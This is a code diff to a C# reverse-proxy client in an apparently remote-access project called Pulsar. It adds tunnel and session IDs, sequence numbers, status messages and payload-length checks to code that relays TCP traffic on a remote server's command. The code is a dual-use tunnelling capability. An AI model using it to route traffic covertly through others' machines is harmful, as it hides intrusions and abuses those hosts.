@@ -2,6 +2,7 @@
 using System;
 using System.Net;
 using System.Net.Sockets;
+using System.Threading;
 
 namespace Pulsar.Client.ReverseProxy
 {
@@ -17,6 +18,12 @@ namespace Pulsar.Client.ReverseProxy
         private byte[] _buffer;
         private bool _disconnectIsSend;
         private bool _disposed;
+        private long _sequence;
+        private string _listenerSessionId;
+        private string _tunnelId;
+        private string _originClientId;
+        public string ListenerSessionId { get { return _listenerSessionId; } }
+        public string TunnelId { get { return _tunnelId; } }
 
         public ReverseProxyClient(ReverseProxyConnect command, Networking.Client client)
         {
@@ -24,6 +31,9 @@ namespace Pulsar.Client.ReverseProxy
             this.Target = command.Target;
             this.Port = command.Port;
             this.Client = client;
+            this._listenerSessionId = command.ListenerSessionId;
+            this._tunnelId = command.TunnelId;
+            this._originClientId = command.OriginClientId;
             this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
             //Non-Blocking connect, so there is no need for a extra thread to create
@@ -53,7 +63,13 @@ namespace Pulsar.Client.ReverseProxy
                         IsConnected = false,
                         LocalAddress = null,
                         LocalPort = 0,
-                        HostName = Target
+                        HostName = Target,
+                        ListenerSessionId = _listenerSessionId,
+                        TunnelId = _tunnelId,
+                        Sequence = Interlocked.Increment(ref _sequence),
+                        Status = Pulsar.Common.Enums.ReverseProxyStatus.Failed,
+                        ErrorCode = "REVERSE_PROXY_CONNECT_FAILED",
+                        ErrorMessage = "Unable to connect to target."
                     });
                     Disconnect();
                 }
@@ -65,7 +81,11 @@ namespace Pulsar.Client.ReverseProxy
                     IsConnected = true,
                     LocalAddress = localEndPoint.Address.GetAddressBytes(),
                     LocalPort = localEndPoint.Port,
-                    HostName = Target
+                    HostName = Target,
+                    ListenerSessionId = _listenerSessionId,
+                    TunnelId = _tunnelId,
+                    Sequence = Interlocked.Increment(ref _sequence),
+                    Status = Pulsar.Common.Enums.ReverseProxyStatus.Connected
                 });
             }
             else
@@ -100,7 +120,18 @@ namespace Pulsar.Client.ReverseProxy
 
                 byte[] payload = new byte[received];
                 Array.Copy(_buffer, payload, received);
-                Client.Send(new ReverseProxyData { ConnectionId = ConnectionId, Data = payload });
+                if (!Pulsar.Common.Networking.ReverseProxyValidation.IsValidPayloadLength(payload.Length))
+                    throw new InvalidOperationException("Invalid reverse proxy payload length.");
+
+                Client.Send(new ReverseProxyData
+                {
+                    ConnectionId = ConnectionId,
+                    Data = payload,
+                    ListenerSessionId = _listenerSessionId,
+                    TunnelId = _tunnelId,
+                    Sequence = Interlocked.Increment(ref _sequence),
+                    OriginClientId = _originClientId
+                });
             }
             catch (ObjectDisposedException)
             {
@@ -140,7 +171,16 @@ namespace Pulsar.Client.ReverseProxy
                 //send to the Server we've been disconnected
                 try
                 {
-                    Client.Send(new ReverseProxyDisconnect { ConnectionId = ConnectionId });
+                    Client.Send(new ReverseProxyDisconnect
+                    {
+                        ConnectionId = ConnectionId,
+                        ListenerSessionId = _listenerSessionId,
+                        TunnelId = _tunnelId,
+                        Sequence = Interlocked.Increment(ref _sequence),
+                        OriginClientId = _originClientId,
+                        Status = Pulsar.Common.Enums.ReverseProxyStatus.Stopped,
+                        Reason = "client_tunnel_closed"
+                    });
                 }
                 catch { }
             }
@@ -157,6 +197,9 @@ namespace Pulsar.Client.ReverseProxy
         public void SendToTargetServer(byte[] data)
         {
             if (_disposed)
+                return;
+
+            if (!Pulsar.Common.Networking.ReverseProxyValidation.IsValidPayloadLength(data?.Length ?? 0))
                 return;
 
             try
